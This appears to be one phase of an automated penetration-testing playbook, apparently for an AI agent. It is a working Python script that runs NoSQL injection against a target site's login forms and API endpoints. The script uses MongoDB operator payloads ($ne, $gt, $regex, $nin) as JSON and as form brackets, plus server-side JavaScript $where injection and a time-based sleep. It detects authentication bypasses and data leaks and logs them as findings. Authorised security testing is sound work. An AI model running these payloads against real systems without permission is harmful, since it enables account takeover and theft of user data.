**Phase 6b — NoSQL Injection**

  Run AFTER Phase 6. Tests MongoDB/NoSQL injection vectors via JSON bodies and query operators.
  Essential for Node.js/Express apps with MongoDB, CouchDB, etc.

  ```python
  import time, json
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  ALL_FORMS  = _G.get('ALL_FORMS', []) + _G.get('AUTH_FORMS', [])
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])

  nosqli_findings = []

  # ══════════════════════════════════════════════════════════════
  # PART A — NoSQL Operator Injection (MongoDB $ne, $gt, $regex)
  # ══════════════════════════════════════════════════════════════
  # These work when the app passes user input directly into MongoDB queries
  # e.g. db.users.find({username: req.body.username, password: req.body.password})

  NOSQL_PAYLOADS_JSON = [
      # Auth bypass: {username: {"$ne": ""}, password: {"$ne": ""}}
      ({'$ne': ''}, 'MongoDB $ne (not-equal) operator — bypasses if field != empty'),
      ({'$gt': ''}, 'MongoDB $gt (greater-than) operator — matches any non-empty value'),
      ({'$regex': '.*'}, 'MongoDB $regex — matches everything'),
      ({'$exists': True}, 'MongoDB $exists — matches any document with this field'),
      ({'$nin': []}, 'MongoDB $nin (not-in empty list) — matches everything'),
  ]

  # Form-encoded NoSQL payloads (for non-JSON endpoints)
  NOSQL_PAYLOADS_FORM = [
      ('username[$ne]=&password[$ne]=', 'Form-encoded $ne operator'),
      ('username[$gt]=&password[$gt]=', 'Form-encoded $gt operator'),
      ('username[$regex]=.*&password[$regex]=.*', 'Form-encoded $regex'),
      ("username=admin'||'1'=='1", 'JavaScript string injection'),
      ('username=admin&password[$ne]=x', 'Targeted $ne on password only'),
  ]

  print(f"[NoSQLi] Testing {len(ALL_FORMS)} forms for NoSQL injection")

  # Test login forms first (most impactful)
  login_forms = [f for f in ALL_FORMS if any(
      fld.get('type') == 'password' or 'pass' in fld.get('name','').lower()
      for fld in f.get('fields', [])
  )]
  other_forms = [f for f in ALL_FORMS if f not in login_forms]

  for form in login_forms + other_forms[:10]:
      action = form.get('action', BASE)
      url = action if action.startswith('http') else urljoin(BASE, action)
      method = form.get('method', 'post').lower()
      fields = form.get('fields', [])

      field_names = [f['name'] for f in fields if f.get('name')]
      if not field_names:
          continue

      print(f"\n  Testing {method.upper()} {url} fields={field_names}")

      # Get baseline response
      baseline_data = {f['name']: 'testuser_nosqli' for f in fields if f.get('name')}
      try:
          if method == 'post':
              r_base = session.post(url, data=baseline_data, timeout=10, allow_redirects=True)
          else:
              r_base = session.get(url, params=baseline_data, timeout=10)
          baseline_len = len(r_base.text)
          baseline_url = r_base.url
      except Exception:
          continue

      # Test A: JSON body with NoSQL operators
      for operator, desc in NOSQL_PAYLOADS_JSON:
          time.sleep(0.3)
          json_payload = {}
          for f in fields:
              name = f.get('name', '')
              if not name:
                  continue
              if f.get('type') == 'password' or 'pass' in name.lower():
                  json_payload[name] = operator
              elif 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                  json_payload[name] = operator
              else:
                  json_payload[name] = f.get('value', 'test')
          try:
              r = session.post(url, json=json_payload, timeout=10, allow_redirects=True,
                               headers={'Content-Type': 'application/json'})
              # Check for auth bypass indicators
              auth_signs = ['dashboard', 'logout', 'welcome', 'profile', 'account',
                           'admin', 'basket', 'cart', 'settings', 'token']
              body_lower = r.text.lower()
              if any(s in body_lower for s in auth_signs) and r.url != baseline_url:
                  print(f"  [CRITICAL] NoSQL Auth Bypass! ({desc})")
                  print(f"  JSON payload: {json.dumps(json_payload)[:200]}")
                  print(f"  Redirected to: {r.url}")
                  nosqli_findings.append({
                      'url': url, 'type': 'nosql-auth-bypass', 'desc': desc,
                      'payload': json.dumps(json_payload), 'method': 'POST (JSON)',
                  })
                  break
              # Check for different response (data leak)
              if abs(len(r.text) - baseline_len) > 300:
                  print(f"  [HIGH] NoSQL response differs ({desc}) — baseline={baseline_len}b response={len(r.text)}b")
                  print(f"  Response snippet: {r.text[:300]}")
                  nosqli_findings.append({
                      'url': url, 'type': 'nosql-data-leak', 'desc': desc,
                      'payload': json.dumps(json_payload), 'method': 'POST (JSON)',
                  })
                  break
          except Exception:
              continue

      # Test B: Form-encoded NoSQL operators (bracket syntax)
      for raw_payload, desc in NOSQL_PAYLOADS_FORM:
          time.sleep(0.3)
          try:
              r = session.post(url, data=raw_payload, timeout=10, allow_redirects=True,
                               headers={'Content-Type': 'application/x-www-form-urlencoded'})
              auth_signs = ['dashboard', 'logout', 'welcome', 'profile', 'admin', 'basket', 'token']
              body_lower = r.text.lower()
              if any(s in body_lower for s in auth_signs) and r.url != baseline_url:
                  print(f"  [CRITICAL] NoSQL Auth Bypass via form encoding! ({desc})")
                  print(f"  Payload: {raw_payload}")
                  nosqli_findings.append({
                      'url': url, 'type': 'nosql-form-bypass', 'desc': desc,
                      'payload': raw_payload, 'method': 'POST (form)',
                  })
                  break
          except Exception:
              continue

  # ══════════════════════════════════════════════════════════════
  # PART B — NoSQL Injection in API endpoints (JSON bodies)
  # ══════════════════════════════════════════════════════════════
  api_endpoints = [p for p in _G.get('ALL_LINKS', set()) if '/api/' in p or '/rest/' in p]
  api_endpoints += [p['url'] for p in AUTH_PARAMS if '/api/' in p.get('url','') or '/rest/' in p.get('url','')]

  print(f"\n[NoSQLi] Testing {len(api_endpoints)} API endpoints for NoSQL injection")

  for api_url in list(set(api_endpoints))[:15]:
      base_api = api_url.split('?')[0]
      time.sleep(0.3)
      # Try sending JSON with operators
      for operator, desc in NOSQL_PAYLOADS_JSON[:3]:
          try:
              r = session.post(base_api, json={'search': operator, 'q': operator},
                               timeout=10, headers={'Content-Type': 'application/json'})
              if r.status_code == 200 and len(r.text) > 100:
                  # Check if we got data back
                  try:
                      data = r.json()
                      if isinstance(data, (list, dict)) and len(str(data)) > 200:
                          print(f"  [HIGH] NoSQL injection in API: {base_api} ({desc})")
                          print(f"  Response: {str(data)[:300]}")
                          nosqli_findings.append({
                              'url': base_api, 'type': 'nosql-api', 'desc': desc,
                              'payload': json.dumps({'search': operator}), 'method': 'POST (JSON)',
                          })
                          break
                  except Exception:
                      pass
          except Exception:
              continue

  # ══════════════════════════════════════════════════════════════
  # PART C — JavaScript Injection (server-side eval/where)
  # ══════════════════════════════════════════════════════════════
  JS_INJECT = [
      ("'; return true; var x='", 'JS string break + return true'),
      ("1; return true", 'JS statement injection'),
      ("this.password.match(/.*/)//", 'MongoDB $where regex'),
      ("sleep(5000)", 'MongoDB $where sleep (time-based)'),
  ]

  print(f"\n[NoSQLi] Testing JavaScript injection ($where clause)")
  for form in login_forms[:3]:
      action = form.get('action', BASE)
      url = action if action.startswith('http') else urljoin(BASE, action)
      fields = form.get('fields', [])
      user_field = next((f['name'] for f in fields if 'user' in f.get('name','').lower() or 'email' in f.get('name','').lower()), None)
      if not user_field:
          continue
      for payload, desc in JS_INJECT:
          time.sleep(0.3)
          data = {f['name']: f.get('value', 'test') for f in fields if f.get('name')}
          data[user_field] = payload
          try:
              r = session.post(url, data=data, timeout=15, allow_redirects=True)
              auth_signs = ['dashboard', 'logout', 'welcome', 'profile', 'admin']
              if any(s in r.text.lower() for s in auth_signs):
                  print(f"  [CRITICAL] JS Injection auth bypass! ({desc})")
                  nosqli_findings.append({
                      'url': url, 'type': 'js-injection', 'desc': desc,
                      'payload': payload, 'method': 'POST',
                  })
                  break
          except Exception:
              continue

  # Summary
  print(f"\n=== NoSQLi SUMMARY: {len(nosqli_findings)} injection points found ===")
  for f in nosqli_findings:
      print(f"  [{f['type'].upper()}] {f['method']} {f['url']} — {f['desc']}")
  if nosqli_findings:
      _G.setdefault('FINDINGS', []).extend([
          {'severity': 'CRITICAL' if 'bypass' in f['type'] else 'HIGH',
           'title': f"NoSQL Injection — {f['type']} ({f['desc'][:40]})",
           'url': f['url'],
           'method': f.get('method', 'POST'),
           'evidence': f.get('desc', ''),
           'impact': 'Authentication bypass, unauthorized data access',
           'screenshot': '',
           'detail': f} for f in nosqli_findings
      ])

# POST-PHASE SCREENSHOT CHECKPOINT — verify NoSQL injection findings with screenshots
print("\n[SCREENSHOT CHECKPOINT] Verify all NoSQL injection findings:")
for finding in _G['FINDINGS']:
    if 'NoSQL' in finding.get('title', '') or 'nosql' in finding.get('title', '').lower():
        if not finding.get('screenshot'):
            print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
            print(f"    Navigate to: {finding.get('url')}")
            print(f"    browser_action(action='navigate', url='{finding.get('url')}')")
            print(f"    browser_action(action='screenshot', filename='phase_06b_nosqli_{finding.get('title').lower()[:40]}.png')")
            print(f"    Update finding['screenshot'] with the filename")
print("\n  After confirming each finding: if screenshot shows error/rejection/login page, it's FALSE POSITIVE — remove it")
  ```
